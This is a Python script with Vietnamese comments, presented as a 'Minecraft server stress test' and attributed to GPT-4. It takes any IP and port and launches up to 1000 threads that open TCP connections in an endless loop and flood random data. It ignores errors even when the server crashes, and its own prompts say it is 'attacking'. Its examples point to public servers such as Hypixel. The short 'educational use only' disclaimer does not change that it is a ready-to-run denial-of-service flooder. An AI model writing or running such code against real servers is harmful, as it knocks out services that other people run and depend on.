# -*- coding: utf-8 -*-
import socket
import threading
import time
import os
import sys

# Hàm để xóa màn hình console, hoạt động trên cả Windows và Linux/Termux
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Hàm hiển thị thanh tiến trình
def progress_bar():
    print("==================================================================")
    for i in range(101):
        sys.stdout.write(f"\r[*] Đang khởi động và chuẩn bị tài nguyên... [{i}%]")
        sys.stdout.flush()
        time.sleep(0.02) # Tăng/giảm để thanh chạy nhanh/chậm hơn
    print("\n==================================================================")

# Hàm chính để tấn công, mỗi luồng (thread) sẽ chạy hàm này
def attack_thread(ip, port, packets_per_thread):
    # Tạo một gói dữ liệu rác ngẫu nhiên (payload)
    # Kích thước 1024 bytes là khá phổ biến
    random_data = os.urandom(1024)
    
    while True:
        try:
            # Tạo một kết nối socket mới cho mỗi lần gửi
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            
            # Gửi một lượng packet ("cứt") đã định trong mỗi kết nối
            for _ in range(packets_per_thread):
                s.sendall(random_data)

            s.close()
        except socket.error:
            # Lỗi xảy ra (server sập, kết nối bị từ chối, v.v...), cứ tiếp tục thử lại
            pass # Bỏ qua lỗi và tiếp tục vòng lặp
        except Exception as e:
            # Bắt các lỗi khác
            pass

def main():
    clear_screen()
    print("""
    ******************************************************************
    *                                                                *
    *      MINECRAFT SERVER STRESS TEST SCRIPT - BY GPT-4 for you    *
    *                                                                *
    ******************************************************************
    """)
    print("CHÚ Ý: SCRIPT CHỈ DÀNH CHO MỤC ĐÍCH GIÁO DỤC VÀ THỬ NGHIỆM")
    print("HIỆU NĂNG SERVER CỦA BẠN. KHÔNG SỬ DỤNG VỚI MỤC ĐÍCH PHÁ HOẠI.\n")

    progress_bar()
    
    print("[+] Đã Khởi Động Vip1")
    print("[+] Vui lòng nhập IP và Port của server.")
    print("------------------------------------------------------------------")
    print("Ví dụ:")
    print("   Ip server Minecraft: tenmien.com (hoặc 123.45.67.89)")
    print("   Port: 25565")
    print("   (Nếu server không cần nhập port như Hypixel, Aternos có tên miền riêng, hãy nhập port là 25565)")
    print("------------------------------------------------------------------\n")

    try:
        # Nhập thông tin server
        target_ip = input("[>] Nhập IP/Tên miền của server: ").strip()
        target_port = int(input("[>] Nhập Port của server: "))

        # Nhập thông số tấn công
        print("\n------------------------------------------------------------------")
        max_total_packets = 100000000000000000
        max_packets_per_thread = 9999999
        
        total_packets = int(input(f"[>] Số lượng cứt (tổng packet, max: {max_total_packets}): "))
        if total_packets > max_total_packets:
            print(f"[!] Số lượng vượt quá giới hạn. Đặt về giá trị max là {max_total_packets}.")
            total_packets = max_total_packets

        packets_per_thread = int(input(f"[>] Số lượng cứt mỗi luồng (packet/thread, max: {max_packets_per_thread}): "))
        if packets_per_thread > max_packets_per_thread:
            print(f"[!] Số lượng mỗi luồng vượt quá giới hạn. Đặt về giá trị max là {max_packets_per_thread}.")
            packets_per_thread = max_packets_per_thread
        
        if packets_per_thread == 0: packets_per_thread = 1 # Tránh lỗi chia cho 0
        
        # Tính toán số luồng cần tạo
        # Giới hạn số luồng để tránh làm sập máy của chính bạn
        num_threads = min(1000, total_packets // packets_per_thread) 
        if num_threads == 0: num_threads = 1 # Phải có ít nhất 1 luồng
        
        print("------------------------------------------------------------------\n")
        print(f"[*] Chuẩn bị tấn công server: {target_ip}:{target_port}")
        print(f"[*] Số luồng (threads) sẽ được tạo: {num_threads}")
        print(f"[*] Số packet mỗi luồng sẽ gửi liên tục: {packets_per_thread}")
        print("\n[!!!] ĐANG TẤN CÔNG... (Nhấn CTRL + C để dừng lại)")
        time.sleep(3)

        # Bắt đầu tạo và chạy các luồng
        for i in range(num_threads):
            t = threading.Thread(target=attack_thread, args=(target_ip, target_port, packets_per_thread))
            t.daemon = True  # Đặt làm daemon để thread tự thoát khi chương trình chính kết thúc
            t.start()

        # Giữ chương trình chính chạy để các luồng con hoạt động
        while True:
            time.sleep(1)

    except ValueError:
        print("\n[!] Lỗi: Port, số lượng packet và packet mỗi luồng phải là SỐ. Vui lòng chạy lại script.")
    except KeyboardInterrupt:
        print("\n\n[*] Đã dừng script theo yêu cầu của bạn. Tạm biệt!")
    except Exception as e:
        print(f"\n[!] Một lỗi không xác định đã xảy ra: {e}")

if __name__ == "__main__":
    main()